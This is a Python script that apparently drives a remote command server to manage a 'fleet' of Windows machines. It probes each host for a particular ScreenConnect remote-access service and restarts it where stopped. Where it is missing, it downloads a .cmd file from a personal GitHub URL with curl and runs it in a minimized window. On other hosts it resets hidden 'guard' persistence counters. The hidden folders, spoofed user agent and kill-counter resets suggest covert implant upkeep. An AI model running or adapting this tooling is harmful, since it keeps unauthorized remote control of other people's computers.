#!/usr/bin/env python3
"""Fleet Gryxa live scan: probe ALL, recover unhealthy, recheck."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
OUT = Path.home() / "Desktop" / "gryxa_fleet_scan.txt"

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g) "
    "}; Write-Output ('HOST='+$env:COMPUTERNAME); Write-Output 'GRYXA_PROBE_DONE'\""
)

START_CMD = (
    'sc config "ScreenConnect Client (36e506ff016b2151)" start= auto'
    ' & sc start "ScreenConnect Client (36e506ff016b2151)"'
    r" & >C:\ProgramData\WinRTCS\guard.cnt echo 9999"
    r' & start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd'
    " & powershell -NoProfile -NonInteractive -Command "
    "\"$s=Get-Service -Name 'ScreenConnect Client (36e506ff016b2151)' -EA SilentlyContinue; "
    "if($s){Write-Output ('AFTER='+$s.Status)} else {Write-Output 'AFTER=MISSING'}\""
    " & echo START_DONE"
)

INSTALL_CMD = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo INSTALL_GRYXA_QUEUED'
)

GUARD_KICK = (
    r">C:\ProgramData\WinRTCS\extkill.cnt echo 0"
    r" & >C:\ProgramData\WinRTCS\guard.cnt echo 9999"
    r" & >C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15"
    r" & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd"
    r' & start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd'
    " & echo GUARD_KICKED"
)


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=90) as r:
        return r.read().decode(errors="replace")


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_results(cid: int, min_n: int = 85, timeout: float = 210.0) -> list[dict]:
    t0 = time.time()
    last = -1
    while time.time() - t0 < timeout:
        d = api_json(f"/api/cmd/{cid}")
        res = d.get("results") or []
        if len(res) != last:
            print(f"  cmd#{cid} results={len(res)} ({int(time.time()-t0)}s)")
            last = len(res)
        if len(res) >= min_n and (time.time() - t0) >= 90:
            time.sleep(20)
            return (api_json(f"/api/cmd/{cid}").get("results") or [])
        time.sleep(8)
    return (api_json(f"/api/cmd/{cid}").get("results") or [])


def classify(results: list[dict]) -> tuple[dict[str, list[str]], dict[str, str]]:
    buckets: dict[str, list[str]] = {
        "RUNNING": [],
        "STOPPED": [],
        "MISSING": [],
        "WRONG_PATH": [],
        "OTHER": [],
        "NO_PARSE": [],
    }
    detail: dict[str, str] = {}
    for r in results:
        host = r.get("host") or "?"
        out = (r.get("out") or "").replace("\r", "")
        detail[host] = out
        m = re.search(r"GRYXA=([A-Za-z_]+)", out)
        if not m:
            buckets["NO_PARSE"].append(host)
            continue
        status = m.group(1).upper()
        path_ok = "PATH_GRYXA=YES" in out
        path_bad = "PATH_GRYXA=NO" in out
        if status == "RUNNING":
            if path_bad:
                buckets["WRONG_PATH"].append(host)
            else:
                buckets["RUNNING"].append(host)
        elif status in ("STOPPED", "STOP_PENDING", "START_PENDING", "PAUSED"):
            buckets["STOPPED"].append(host)
        elif status == "MISSING":
            buckets["MISSING"].append(host)
        else:
            buckets["OTHER"].append(host)
    return buckets, detail


def fmt_buckets(title: str, cid: int, results: list[dict], buckets: dict[str, list[str]], detail: dict[str, str]) -> list[str]:
    lines = [
        f"=== {title} cmd=#{cid} responded={len(results)} ===",
    ]
    for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        lines.append(f"{k}={len(buckets[k])}")
    lines.append("")
    for k in ("STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        if buckets[k]:
            lines.append(f"--- {k} ---")
            for h in sorted(buckets[k]):
                snip = detail.get(h, "").replace("\n", " | ")[:140]
                lines.append(f"  {h} :: {snip}")
            lines.append("")
    return lines


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    print("PROBE len", len(PROBE))
    assert len(PROBE) < 4000

    print("== live Gryxa probe ALL ==")
    cid = queue("ALL", PROBE)
    results = wait_results(cid)
    buckets, detail = classify(results)
    lines = fmt_buckets("GRYXA LIVE SCAN", cid, results, buckets, detail)
    print("\n".join(lines[:50]))
    print(f"RUNNING={len(buckets['RUNNING'])}")

    started: list[str] = []
    installed: list[str] = []
    for h in buckets["STOPPED"]:
        print(f"== start {h} ==")
        queue(h, START_CMD)
        started.append(h)
        time.sleep(0.1)
    for h in buckets["MISSING"] + buckets["WRONG_PATH"]:
        print(f"== install/recover {h} ==")
        queue(h, INSTALL_CMD)
        installed.append(h)
        time.sleep(0.1)
    for h in buckets["NO_PARSE"] + buckets["OTHER"]:
        print(f"== guard-kick {h} ==")
        queue(h, GUARD_KICK)
        time.sleep(0.1)

    lines.append(f"recover_start={started}")
    lines.append(f"recover_install={installed}")

    if started or installed or buckets["NO_PARSE"] or buckets["OTHER"]:
        wait_s = 180 if installed else 90
        print(f"== wait {wait_s}s then re-probe ==")
        time.sleep(wait_s)
        cid2 = queue("ALL", PROBE)
        results2 = wait_results(cid2)
        b2, d2 = classify(results2)
        lines.append("")
        lines.extend(fmt_buckets("GRYXA RECHECK", cid2, results2, b2, d2))
        buckets, detail = b2, d2

    fleet = api_json("/api/fleet")
    counts = fleet.get("counts") or {}
    online_no = sorted(
        h["host"]
        for h in (fleet.get("hosts") or [])
        if h.get("presence") == "online" and not h.get("has_gryxa")
    )
    lines.append(f"=== SIGHT counts {counts} ===")
    lines.append(f"sight_online_no_gryxa={online_no}")

    report = "\n".join(lines) + "\n"
    OUT.write_text(report, encoding="utf-8")
    print(report)
    print("wrote", OUT)

    bad = buckets["STOPPED"] + buckets["MISSING"] + buckets["WRONG_PATH"]
    return 0 if not bad else 2


if __name__ == "__main__":
    raise SystemExit(main())
